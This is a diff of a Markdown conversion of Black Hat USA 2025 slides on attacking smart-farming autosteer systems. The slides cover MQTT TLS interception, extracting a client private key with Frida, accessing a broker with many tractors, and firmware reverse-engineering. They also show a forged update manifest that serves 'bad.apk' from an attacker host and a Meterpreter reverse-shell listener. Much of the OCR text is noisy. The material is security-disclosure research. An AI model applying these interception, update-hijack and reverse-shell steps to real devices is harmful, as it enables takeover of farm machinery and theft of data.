@@ -8,19 +8,25 @@ year: 2025
 source_pdf: "BlackHat_USA_2025_Slides/Felix Eberstaller&Bernhard Rader&Sebastian Ranftl_Tracking the Tractors Analyzing Smart Farming Automation Systems for Fun and Profit.pdf"
 pages: 51
 sha256: "8d0583aece0bc9208ac982069c90154b458794a84375c9691bcdb151335d8d9c"
-text_chars: 25508
-ocr_pages: 22
+text_chars: 21562
+ocr_pages: 19
 has_ocr: true
 redacted_secrets: 0
+ocr_confidence: 84.2
+ocr_unreliable_blocks: 0
+vision_verified_blocks: 2
+ocr_timeouts: 0
+pages_recovered_from_text_layer: 0
 companion_files: []
 extractor: "pymupdf4llm 1.28.2 + tesseract"
-converted_at: "2026-08-11T22:53:38Z"
+converted_at: "2026-08-12T05:10:10Z"
 ---
 # Tracking the Tractors Analyzing Smart Farming Automation Systems for Fun and Profit
 
 **Speakers:** Felix Eberstaller, Bernhard Rader, Sebastian Ranftl  
 **Conference:** Black Hat USA 2025  
 **Source:** `BlackHat_USA_2025_Slides/Felix Eberstaller&Bernhard Rader&Sebastian Ranftl_Tracking the Tractors Analyzing Smart Farming Automation Systems for Fun and Profit.pdf` (51 pages)
+
 
 ## Slide 1
 
@@ -30,16 +36,15 @@ Analyzing Smart Farming Automation Systems
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 90/100 on the text kept, 87/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-pie hat
 EFINGS
 AUGUST be 2025
 MANDALAY BAY / LAS VEGAS
 Tracking the Tractors
 Analyzing Smart Farming Automation Systems
-#BHUSA @BlackHatEvents
 ```
 
 ## Slide 2
@@ -54,7 +59,8 @@ Analyzing Smart Farming Automation Systems
 
 **#BHUSA @BlackHatEvents**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 93/100 on the text kept, 93/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Digitalization in Farming
@@ -76,9 +82,6 @@ Field Robots
 50%
 60%
 70%
-bisa hat
-USA 2025
-#BHUSA @BlackHatEvents
 ```
 
 ## Slide 4
@@ -87,11 +90,10 @@ USA 2025
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 92/100 on the text kept, 91/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisa hat
-USA 2025
 Research and attacks on smart farming
 Ransomware attack on farmer kills cow and her
 calf
@@ -111,10 +113,8 @@ Agri cultural systems when he wasn’t receiving data on his cows
 being milked. He was then informed by the
 Dev1 ces. manufacturer of his milking systems that a
 ransomware attack had taken place, in which his
-®
 DEF CON 30 ICk. Co VES data had been compromised, and threat actors
 e : were demanding $10,000.
-#BHUSA @BlackHatEvents
 ```
 
 ## Slide 5
@@ -151,14 +151,6 @@ Navmopo AT1 / AT2
 
 **#BHUSA @BlackHatEvents**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-bisek hat
-USA 2025
-#BHUSA @BlackHatEvents
-```
-
 ## Slide 9
 
 ###### **GPS+RTK**
@@ -175,36 +167,59 @@ BLUETOOTH
 
 **#BHUSA @BlackHatEvents**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Read by a vision model from the page image (replacing unreliable OCR) — confidence 70/100 on the text kept, 69/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**
 
 ```text
-bisek hat
 Intercepting and Decrypting MQTT Broker Connections
-A4OMO@BBRA Reo KhMBZGOCVGER
-fi tcp.stream eq 32|
-No. Time Source Destination Protocol Length Info
-48847 6660.6472689.. 10.1.1.16 51.138 .177.99 TCP 74 34602 . 8883 [SYN] Seq=0 Win=65535 Len=@ MSS=1460 SACK_PERM TSval=4294898197 TSecr=@ WS=64
-48851 6660.6920928.. 51.138.177.
-10.1.1.16 i TCP
-48356 Q.7
-48857 6660. 7499897.
-48858 666)
-9
-64 :
-6 61.1 Tl & Data
-67 10.1 T 60 : 3B3 [ACK] Seq=1152 Ack 3 Wi 49 Len=a
-68 Q 10.1 Tl 204 Data
-77 6661.1633148.. 51.1 Tl Et]
-878 6661.1764 10.1 Tl 1405
-80 6661 51.1 T 87
-81 6661.: 51.1 Ls 98
-82 6661 10.1 Tl 60 40 Len=0
-4
-+ Frame 48857: 1767 bytes on wire (14136 bits), 1767 bytes captured (14136 bits) on interfz 60 65 f6 c3 88 06 16 63 O03 GO 57 G2 OB OO 53 83 o+ tee “We -S.
-+ Transmission Control Protocol, Src Port: 8883, Dst Port: 34602, Seg: 1, Ack: 168, Len: 11 9060 cr 20 BSU6GI7S02I6bS92o0d2 es ebeeceeos - | LY!f9 .-DK>--D
-~ Transport Layer Security go7Ta FO ae Fe de 18 eb 45 55 27 af £9 2f aa Oe ad FG e~s- EU fesse ee
-~ TLSV1.2 Record Layer: Handshake Protocol: Server Hello 0080 BIS co 2f 88 00 Ob ff O01 68 01 88 BH Oh OO O82 es... ss.
-#BHUSA @BlackHatEvents
+
+[black hat USA 2025 logo, top right]
+
+[Wireshark window]
+Filter: tcp.stream eq 32
+
+No.    Time            Source          Destination     Protocol  Length  Info
+48847  6660.6472689…  10.1.1.10       51.138.177.99   TCP         74    34602 -> 8883 [SYN] Seq=0 Win=65535 Len=0 MSS=1460 SACK_PERM TSval=4294898197 TSecr=0 WS=64
+48851  6660.6920928…  51.138.177.99   10.1.1.10       TCP         66    8883 -> 34602 [SYN, ACK] Seq=0 Ack=1 Win=1460 Len=0 MSS=1460 SACK_PERM WS=512
+48852  6660.6944869…  10.1.1.10       51.138.177.99   TCP         60    34602 -> 8883 [ACK] Seq=1 Ack=1 Win=87616 Len=0
+48855  6660.7027962…  10.1.1.10       51.138.177.99   TLSv1.2    221    Client Hello (SNI=iot-emq-ne.fjdac.com)
+48856  6660.7475054…  51.138.177.99   10.1.1.10       TCP         54    8883 -> 34602 [ACK] Seq=1 Ack=168 Win=2560 Len=0
+48857  6660.7499097…  51.138.177.99   10.1.1.10       TLSv1.2   1767    Server Hello, Certificate, Server Key Exchange, Certificate Request, Server Hello Done
+48858  6660.7586642…  10.1.1.10       51.138.177.99   TCP         60    34602 -> 8883 [ACK] Seq=168 Ack=1461 Win=90560 Len=0
+48859  6660.7598339…  10.1.1.10       51.138.177.99   TCP         60    34602 -> 8883 [ACK] Seq=168 Ack=1714 Win=93440 Len=0
+48860  6660.7900249…  10.1.1.10       51.138.177.99   TLSv1.2    919    Certificate, Client Key Exchange, Certificate Verify, Change Cipher Spec, Encrypted Handshake Message
+48862  6660.8348020…  51.138.177.99   10.1.1.10       TCP         54    8883 -> 34602 [ACK] Seq=1714 Ack=1033 Win=5632 Len=0
+48863  6660.8364909…  51.138.177.99   10.1.1.10       TLSv1.2    105    Change Cipher Spec, Encrypted Handshake Message
+48864  6660.8843026…  10.1.1.10       51.138.177.99   TCP         60    34602 -> 8883 [ACK] Seq=1033 Ack=1765 Win=93440 Len=0
+48865  6661.0493503…  10.1.1.10       51.138.177.99   TLSv1.2    173    Application Data
+48866  6661.1026403…  51.138.177.99   10.1.1.10       TLSv1.2     87    Application Data
+48867  6661.1051654…  10.1.1.10       51.138.177.99   TCP         60    34602 -> 8883 [ACK] Seq=1152 Ack=1798 Win=93440 Len=0
+48868  6661.1161036…  10.1.1.10       51.138.177.99   TLSv1.2    204    Application Data
+48877  6661.1633148…  51.138.177.99   10.1.1.10       TLSv1.2     89    Application Data
+48878  6661.1764768…  10.1.1.10       51.138.177.99   TLSv1.2   1405    Application Data, Application Data
+48880  6661.2340345…  51.138.177.99   10.1.1.10       TLSv1.2     87    Application Data
+48881  6661.2341086…  51.138.177.99   10.1.1.10       TLSv1.2     98    Application Data
+48882  6661.2375900…  10.1.1.10       51.138.177.99   TCP         60    34602 -> 8883 [ACK] Seq=2653 Ack=1910 Win=93440 Len=0
+
+[Red highlight box around packets 48855-48863; packet 48857 selected]
+
+[Packet detail pane]
+> Frame 48857: 1767 bytes on wire (14136 bits), 1767 bytes captured (14136 bits) on interfa…
+> Ethernet II, Src: ProxmoxServe_50:ac:fc (bc:24:11:50:ac:fc), Dst: ItonTechnolo_2c:d5:d2 (…
+> Internet Protocol Version 4, Src: 51.138.177.99, Dst: 10.1.1.10
+> Transmission Control Protocol, Src Port: 8883, Dst Port: 34602, Seq: 1, Ack: 168, Len: 17…
+v Transport Layer Security
+   v TLSv1.2 Record Layer: Handshake Protocol: Server Hello
+
+[Hex dump pane]
+0030   00 05 f6 c3 00 00 16 03   03 00 57 02 00 00 53 03   ·········W···S·
+0040   03 68 41 a2 6d 9d 5c 95   0a 6c 96 9f bc c0 e2 d2   ·hA·m·\·  ·l······
+0050   c5 ff 90 e0 51 ce 76 03   2c 69 78 ff 0f 64 8f 2a   ····Q·v·  ,ix··d·*
+0060   c7 20 e3 6c 79 21 66 39   2e d2 44 4b 3e c8 e0 44   ·  ·ly!f9  ··DK>··D
+0070   70 ae 7e dc 10 eb 45 55   27 a0 f9 2f aa 0e a4 76   p·~···EU  '··/···v
+0080   61 13 c0 2f 00 00 0b ff   01 00 01 00 00 0b 00 02   a·./····  ········
+
+#BHUSA  @BlackHatEvents
 ```
 
 ## Slide 11
@@ -213,12 +228,10 @@ No. Time Source Destination Protocol Length Info
 
 **#BHUSA @BlackHatEvents**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 93/100 on the text kept, 92/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisa hat
-USA 2025
-Intercepting and Decrypting MQTT Broker Connections
 ~ ) sudo eptabees -t nat -A PREROUTING -i ethO -p tcp --dport 8883 -j REDIRECT --to-port 8883
 ~ ) qsslcaudit -l 0.0.0.0 -p 8883
 preparing selaciiad tests.
@@ -236,12 +249,9 @@ skipping test: test for DTLS protocol and LOW grade ciphers support
 skipping test: test for DTLS 1. 2 protocol and MEDIUM grade ciphers support
 CVE-2020-0601: no CA certificate provided
 skipping test: test for trusting certificate signed by private key with custom curve
-39 f
-NN@o¢
 SSL library used: OpenSSL 1.0.2u 20 Dec 2019
 running test #3: certificate trust test with self-signed certificate for www.example.com
 listening on 0.0.0.0:8883
-#BHUSA @BlackHatEvents
 ```
 
 ## Slide 12
@@ -250,11 +260,11 @@ listening on 0.0.0.0:8883
 
 **#BHUSA @BlackHatEvents**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 90/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 bisek hat
-Intercepting and Decrypting MQTT Broker Connections
 SSL library used: OpenSSL 1.0.2u 20 Dec 2019
 running test #3: certificate trust test with self-signed certificate for www.exampl
 listening on 0.0.0.0:8883
@@ -264,11 +274,9 @@ received data: x
 disconnected
 report:
 test failed, client accepted fake certificate, data was intercepted
-result: FAILED
 test finished
 running test #8: test for SSLv2 protocol support
 listening on 0.0.0.0:8883
-#BHUSA @BlackHatEvents
 ```
 
 ## Slide 13
@@ -285,10 +293,10 @@ MQTT-ClientId = Product ID + Serial Number (SN) + Timestamp MQTT-User      = Pro
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 81/100 on the text kept, 72/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-piseK hat
 Intercepting and Decrypting MQTT Broker Connections “**
 = MOQTT Explorer Q oO Dis
 ONNECT &
@@ -300,14 +308,10 @@ matt:/imatt.eclipse.org:1883 Name
 test.mosquitto.org
 mattJ/test.mosquitto.org:1883/
 matt-ne = Protocol Host Port
-mawtiovemane tascam’ matt// ~ — matt-s-ne.fidac.com 8884
 matt new :
-matt:/imatt-s-ne. fidac.com:8884. :
 matt tls ; Username Password
-mgtt//matt-s-ne.fjdac.com:8884/ : mq2Gsy84 eeeccese a
 write EPROTO 46093589712800:error:10000410:SSL
 routines:OPENSSL_internal:SSLV3_ALERT_HANDSHAKE_FAILURE:../../third_party/boringssl/src/ssl/tls_record.cc:592:SSL alert number 40
-#BHUSA @BlackHatEvents
 ```
 
 ## Slide 15
@@ -316,23 +320,15 @@ routines:OPENSSL_internal:SSLV3_ALERT_HANDSHAKE_FAILURE:../../third_party/boring
 
 **#BHUSA @BlackHatEvents**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 81/100 on the text kept, 72/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 2025
-Intercepting and Decrypting MQTT Broker Connections
 File Edit View Go Capture Analyze Statistics Telephony Wireless Tools Help
-A4Od@B8RRB Re OTH MB SOCCER
 Al tcp.stream eg 32
 No. Time Source Destination Protocol Length Info
-4aa4y 6472689... 10.1.1.
 48851 .6920928.. 51.
-48852 5 a 10.
-49855 .7027' 10.
 48856 é 51.
-48857 5 Oo7.. SL.
-: 10.
 10.
 TCP 34602 — 8883 [SYN] Seq=0 Win=65535 Len=0 MSS=1460 SACK_PERM TSval=4794898197
 TCP 8583 . 34602 (SYN, ack] Bed @ Ack=1 Win=1460 Len=@ MSS=1460 SACK_PERM WS=512
@@ -341,8 +337,6 @@ TLSv1. 3 Client Hello
 TLSv1.2 rver Hello
 TCP :
 TCP
-te.
-Bo
 TCP
 TLSvi.2
 TCP :
@@ -356,63 +350,41 @@ ol
 ol
 oal
 oal
-cdl,
-cdl,
-13
-13
 odl
 al,
-cdl,
-13
-13
-cdl,
-13
-13
-cal,
-13
-cal,
-cal,
-13
 >» Frame 48860: 919 bytes on wire (7352 bits), 919 bytes captured (7352 bits) on interface « 05 b4 6a cB 00 G9 16 03 O38 62 51 Bb OO 62 4d OO on ae
 » Internet Protocol Version 4, Src: 16.1.1.10, Dst: 51.138.177.99 a5 6e 18 ic 6a 55 5d Of 30 Od OG O89 2a B86 48 86 ome JU)
 » Transmission Control Protocol, Sre Port: 34602, Dst Port: 8883, Seq: 168, Ack: 1714, Len: f7 @d 01 O21 Ob O5 6G 30 Tb 31 Ob 30 09 06 O3 55 as as
-#BHUSA @BlackHatEvents
 ```
 
 ## Slide 16
 
 #### **Intercepting and Decrypting MQTT Broker Connections**
 
-```
+\```
 [……………]
-```
+\```
 
 **#BHUSA @BlackHatEvents**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 81/100 on the text kept, 77/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-biseichat
-USA 2025
-Intercepting and Decrypting MQTT Broker Connections
 f/_ | Frida 17.0.7 - A world-class dynamic instrumentation toolkit
-on
 > | Commands:
 ff |_| help -> Displays the help system
 : object? -> Display information about ‘object’
 exit/quit -> Exit
 More info at https://frida.re/docs/home/
 to Connected to 10.1.1.10:12345 (id=socket@10.1.1.10:12345)
-spawning com.fj.smartkit’...
 spawned ‘com.fj.smartkit . Resuming main thread!
-Remote: :com.fj].smartkit ]-> [+] CertificateFactory.getInstance: X.509
 +] KeyStore.setKeyEntry: private-key
 ‘Mp PRIVATE KEY in keystore (first 32 bytes Mex) : 30 fll
 “MD PRIVATE KEY in keystore (base6d4) : M1 [jIIIISIItlllllllllllllllllllllttltttttttttttttttt
 +] KeyManagerFactory.init called
 _!] KeyManagerFactory initialized with keystore type: BKS
 +] SSLContext.getInstance: TL5v1.2
-#BHUSA @BlackHatEvents
 ```
 
 ## Slide 17
@@ -421,16 +393,12 @@ _!] KeyManagerFactory initialized with keystore type: BKS
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 80/100 on the text kept, 68/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 2025
-Intercepting and Decrypting MQTT Broker Connections
 = MOTT Explorer Q. Search... oO DISCONNECT & A)
 ¥ iot-emg-ne.fjdac.com
-v sys Topic | a
-¥ mg2Gsy84
 ¥ default
 ¥ event
 workLog = {"data":{"axonSWEF":0.0,"backwardintegral":0,"baseDirect":81.87
@@ -441,24 +409,17 @@ report = {"properties":{"deviceLockStatus":0,"workProgress":1,"workStatus”: Va
 QoS: 0
 07/18/2025 10:19:50
 AM
-Rrewruunage ey
 "forwardIntegraLl": 1,
 "gpsWorkStatus": 4,
 "imuErrorRate": 6,
 "imuSupplyVoltage": 655.35,
 "imuType": 1,
-"“imuUpdateTo":
 "inputVoltage": 0.85,
 "internalSupplyVoltage": 65
-"Locationlo": 6,
 "mainAntennaVoltage": 1.98,
-RRRRRRRVRVRA
 v
 =
-uw
-fei
 2
-#BHUSA @BlackHatEvents
 ```
 
 ## Slide 18
@@ -513,43 +474,38 @@ Basic info about the vehicle (e.g. wheel width, turning radius, …) Current Wor
 
 **#BHUSA @BlackHatEvents**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 77/100 on the text kept, 75/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisa hat
-USA 2025
 = MOQTT Explorer Q. Search... © DISCONNECT &
 ¥ iot-emgq-ne.fjdac.com
-¥
-¥ sys
 ® oLpOnkbo (111 topics, 848 messages)
 b ul6sPOJI (63 topics, 767 messages)
 & VRUfjwhC (23 topics, 23 messages)
- gwO05N9wh (87 topics, 1047 messages)
+gwO05N9wh (87 topics, 1047 messages)
 ® p91XHQgD (25 topics, 23 messages)
 & akiSUOwS (24 topics, 24 messages)
 & NKFwtJYS (69 topics, 69 messages)
 bm nrusPOli (261 topics, 7729 messaqes)
- mq2GSy24 (652 topics, 18747 messages)
+mq2GSy24 (652 topics, 18747 messages)
 & SYOAAMHZ (47 topics, 827 messages)
 & 40D4kmKS (230 topics, 6605 messages)
 > oEOTLHSn (70 topics, 1113 messages)
- gaJmF924 (216 topics, 4813 messages)
+gaJmF924 (216 topics, 4813 messages)
 ® KxhOksLwW (287 topics, 2800 messages)
 & ipK8O9DB (6 topics, 157 messages)
 & eyL8g¥kh (44 topics, 1413 messages)
 ® JX7LxalR (6 topics, 234 messages)
- ObS4HfGt (8 topics, 220 messages)
+ObS4HfGt (8 topics, 220 messages)
 ® SKBRtdbl (262 topics, 4796 messages)
 & yRGmadrwWi (2 topics, 74 messages)
 ® kKHOZxn6E (20 topics, 534 messages)
- XxTJIFYC (2 topics, 73 messages)
- dwxXRAHrO (1 topic, 15 messages)
+XxTJIFYC (2 topics, 73 messages)
+dwxXRAHrO (1 topic, 15 messages)
 ® YttOIKKY (1 topic, 134 messages)
 & JRUKrp3u (6 topics, 218 messages)
 & Sg9WG6yXy (34 topics, 440 messages)
-MAINE DM 621 taniece AAT macesanact
-#BHUSA @BlackHatEvents
 ```
 
 ## Slide 23
@@ -631,11 +587,10 @@ Africa South America Oceania
 
 **#BHUSA @BlackHatEvents**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 95/100 on the text kept, 95/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisa hat
-USA 2025
 Do not use on public roads
 Safety Instructions
 Betore using this system, make sure that you have read the user manual and keep in mind
@@ -652,7 +607,6 @@ property damages.
 intervention.
 (6) Ensure that this system is shut down before driving the vehicle to a public area.
 | Understand |
-#BHUSA @BlackHatEvents
 ```
 
 ## Slide 29
@@ -661,14 +615,13 @@ intervention.
 
 **#BHUSA @BlackHatEvents**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 89/100 on the text kept, 85/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
 Tractors found 20 kilometers from front line (Ukraine) “**
 20.03
 Distance, KM
-#BHUSA @BlackHatEvents
 ```
 
 ## Slide 30
@@ -723,17 +676,6 @@ Distance, KM
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-bisek hat
-USA 2025
-i
-2
-3
-4
-```
-
 ## Slide 35
 
 ## **Attack Paths**
@@ -767,73 +709,54 @@ Physical Access
 
 **#BHUSA @BlackHatEvents**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 78/100 on the text kept, 64/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-2)
-black hat
 LL USA 2025
 12| 1
-12 "data':f
-14 "ad": 1940338876029394945,
-15 "si lentDownlLoadFlag":"1",
 16 "autoUpgradeFlag":"1",
 17 "upgradePrompt":"Totally Not A Virus, Trust Me...T'm a Dolphin v2",
 18 "upgradePromptList":[
-1g 1
 20 "Langid":3,
 21 "LangCode":"en",
 2D "orompt":"Totally Not A Virus, Trust Me...I'm a Dolphin QOO000"
 23 t
-24 .
 25, "VersionNo":"4232 - BH USA Edition",
-26 "UupgradePackageType":0,
-27 "bindUpgradeFlag":"0",
-23 "upgradeFileList":[
 25 {
-20 "Ff LeTag":"APP",
 31 "fileNo":"25.103.1.28",
 a2 "fi leName":"bad.apk",
-=e) "filePath":"http://10.1.1.1:8000/bad.apk",|
-24 "£4 LeMdS" :"a5913ce4b04c2e66318ce74tedsstall",
 25, "Fy leSize":- 10229
 36 t
 37 ]
-3e| tt,
-3g "code":0,
-41|}
-#BHUSA @BlackHatEvents
 ```
 
 ## Slide 38
 
 **#BHUSA @BlackHatEvents**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 88/100 on the text kept, 87/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 bisek hat
-USA 2025
 Upgrade tips
 Version: V4232 - BH USA Edition
 New version detected. Do you want to upgrade?
 25.103.1.28 10.0KB
 Updatelllustrate:
 Totally Not A Virus, Trust Me...I'm a Dolphin 9
-93
 x Cancel V Upgrade
-#BHUSA @BlackHatEvents
 ```
 
 ## Slide 39
 
 **#BHUSA @BlackHatEvents**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 83/100 on the text kept, 83/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-pif hat
-USA 2025
 ~/badapk > mstconsole -q -x “use multi/handler; set payload android/meterpreter/reverse tcp; set lhost ethO; set Lport 1234; exploit"
 [*] Using configured payload generic/shell reverse tcp
 payload => android/meterpreter/reverse tcp
@@ -856,7 +779,6 @@ os : Android 9 - Linux 4.9.113 (armv71)
 Architecture : armv7L
 System Language : en_US
 Meterpreter -: dalvik/android
-#BHUSA @BlackHatEvents
 ```
 
 ## Slide 40
@@ -871,63 +793,33 @@ Meterpreter -: dalvik/android
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 80/100 on the text kept, 63/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-erry
-CU_V103.0.4.12_02503271009.bin.txt
 undefined
 undefined4
 byte *
-undefined1
-ushaort
-O8008ca4
-O8008ca6
-O8008ca8
-O8008caa
-O8008cac
 O8008cae
-os8008cb2
-osoo8cbh4
-psoo8cb6
 O8008cba
-osogscbh
-os8o08cbe
-osod8cbd
-os8008cbe
-oso08cbt
-O8008ec0
-O8068ec1
-O8008cc2
-O8008cc6
-O8008cc8
-O8008ecc
-O8008cce
-os008ed2
 bo
 cB
 Ac
 ag
 12
-ao
 66
 ld
 df
-64
 2a
 6d
 33
 39
 44
-da
-66
 42
 16
-(ee
 22
 18
 bo
-bS
 7b
 88
 28
@@ -937,16 +829,8 @@ ds
 31
 46
 bd
-Goad aomo domo cca om om a ok ke aa
-a
 FUNCTION a
-SOc” oaomc domo cca om oak a i ok ke aa
 undefined — stdcall fun_packet_handler(undefined4 param...
-ra:l
-ro:4
-rli4
-<RETURN=>
-param_no_idea whats that
 packet_buffer
 HASH: 5f547aG... packet_cmd
 HASH: 5f9f6ae... packet_len
@@ -954,14 +838,10 @@ fun_packet_handler
 push {r4,r5,r7, lr}
 ldrb param_no_idea_whats_that, [packet_butfer, #0xT]
 ldrh r4, [packet_buffer, #0x2]
-cmp param_no_idea whats that, #0xag
 ble LAB_O8008cd4
-sub.w r2,param_no_idea whats _that,#0xaa
 cmp r2,#0x6
-bhi switchD_OG008cb6: :caseD_7
 switchD_OO008cb6: :switchD
 thb [pe, r2]
-switchD_O0008ch6: :switchdataD_oo008cba
 db 4h
 db 24h
 db 6Dh
@@ -969,16 +849,11 @@ db 33h
 db 39h
 db 44h
 db 4h
-et OGh
-switchD_O0008ch6:; :caseD_aa
 movw
 adds
 movt
 mov
-bl
 pop
-KREF[1] : ic)
-param_no_idea whats _that,#0x2bc8
 packet_butfer, #0x10
 param_no_idea whats_that=>DAT_20002bc8, #0x 2000
 r2,r4
@@ -989,14 +864,10 @@ fun_cmd_heartrequest
 2
 3
 4
-es
 6
 7
 8
-i)
 blackhat
-USA 2025
-> (N1904_AT2_ECU_V103.0.4.12_D2503271009.bir
 void fun_packet_handler(undefined4 param_no idea whats _that,byte *packet_but-
 {
 byte bVarl;
@@ -1008,33 +879,23 @@ if (bVarl < Oxaa) {
 if (bVarl == 0x55)
 fun_cmd_exec (SDAT 20002968, packet_buffer + Ox10,uVar2);
 returns
-+
 if (bVarl == ors6) Gi
-fun_cmd_set_param(&DAT_2000c328, packet_butfer + 0x10,uVar2);
 return;
-}
 if (bVarl == ons)
-Tun_emd_heartbeat (&0AT 20002cb0,packet_butfer + Ox10,uVar2);
-return;
 }
-+
 else {
-switch(bVarl) {|
 case Oxaa:
 Tun_cmd_heartrequest (&DAT_20002bc8, packet_buffer + @x10,uVar2)
 return;
 case Qxab:
-fun_cmd_cOnfigrequest (SDAT_20003212, packet_butfer + Ox10,uVar2);
 return;
 case Oxac:
 break;
 case Oxad;
-So contigtpacket butter + Ox10,uVar2);
 fun_cmd
 returns
 case orae
 fun_cmd_curvel(packet_buffer + Ox10,uVar2)
-#BHUSA @BlackHatEvents
 ```
 
 ## Slide 42
@@ -1088,35 +949,31 @@ waypoints|FUN_00006698|
 
 **#BHUSA @BlackHatEvents**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Read by a vision model from the page image (replacing unreliable OCR) — confidence 69/100 on the text kept, 63/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**
 
 ```text
-bisa hat
-USA 2025
-2025-06-167T10:34:07.060127 | iot-emq-ne.fjdac.com | /sys/KxhOksLW/default/FJLQ1/4252001722
-C/function/invoke/reply | {'functionId': 'takePhoto', '‘messageId': '1934560102874513408',
-‘output': {'desc': ‘'takePhoto# #8 im 1934560102874513408', ‘result': '1', ‘ts': 17500700
-51359, ‘url': ‘https://middle-mower-ne-1304943718. _
-(1750070050186.png'}, ‘success’: True, ‘timestamp’: 1750070051359}
-2025-06-16T10:34:10.138817 | grader-emq-ne.fjdac.com | /sys/KxhOksLW/default/FILQ174252001
-72ZC/function/invoke/reply | {'functionId': ‘takePhoto', ‘messagelId': '193456011550/7/5/056
-', ‘output': {'desc': 'takePhoto# (Rit 1934560115507757056', ‘result’: ‘'1', 'ts': 17500
-TAASAARGQ furl’: ‘'https://middle-mower-ne-1304943718. : _— ' ,
-/1750070053234.png'}, ‘success': True, ‘timestamp’: 1750070054439}
-#BHUSA @BlackHatEvents
+[black hat USA 2025 logo, top right]
+
+[Terminal / log output. Purple bars mark redacted portions of the URLs.]
+
+2025-06-16T10:34:07.060127 | iot-emq-ne.fjdac.com | /sys/KxhOksLW/default/FJLQ17425200172Z
+C/function/invoke/reply | {'functionId': 'takePhoto', 'messageId': '1934560102874513408',
+'output': {'desc': 'takePhoto事件反馈 1934560102874513408', 'result': '1', 'ts': 17500700
+51359, 'url': 'https://middle-mower-ne-1304943718.[REDACTED]
+[REDACTED]/1750070050186.png'}, 'success': True, 'timestamp': 1750070051359}
+2025-06-16T10:34:10.138817 | grader-emq-ne.fjdac.com | /sys/KxhOksLW/default/FJLQ174252001
+72ZC/function/invoke/reply | {'functionId': 'takePhoto', 'messageId': '1934560115507757056
+', 'output': {'desc': 'takePhoto事件反馈 1934560115507757056', 'result': '1', 'ts': 17500
+70054439, 'url': 'https://middle-mower-ne-1304943718.[REDACTED]
+[REDACTED]/1750070053234.png'}, 'success': True, 'timestamp': 1750070054439}
+
+#BHUSA  @BlackHatEvents
 ```
 
 ## Slide 46
 
 **#BHUSA @BlackHatEvents**
-
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-bisek hat
-USA 2025
-#BHUSA @BlackHatEvents
-```
 
 ## Slide 47
 
@@ -1134,18 +991,14 @@ USA 2025
 
 **#BHUSA @BlackHatEvents**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 90/100 on the text kept, 78/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 2025
 Robot elevators The robot opens Introduction to Robot information
-AMA MAAAA HiABA
-AApBmAASUBA MEMBA
 Robot elevators
 Bekaxin robot elevator system
 According to IFR statistics, the scale of China's service robot market continued
-#BHUSA @BlackHatEvents
 ```
 
 ## Slide 49
